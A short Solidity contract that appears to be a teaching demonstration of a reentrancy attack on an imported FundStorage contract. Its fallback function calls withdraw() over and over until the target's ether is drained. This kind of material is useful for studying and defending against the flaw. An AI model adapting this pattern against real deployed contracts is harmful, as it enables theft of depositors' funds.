// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./fundStorage.sol";

contract AttackReentarncy {
    FundStorage public fundstorage;

    constructor(address _fundStorageAddress) public {
        fundstorage = FundStorage(_fundStorageAddress);
    }

    fallback() external payable {
        if (address(fundstorage).balance >= 1 ether) {
            fundstorage.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "amount is smaller then 1 ether");
        fundstorage.deposit{value: 1 ether}();
        fundstorage.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
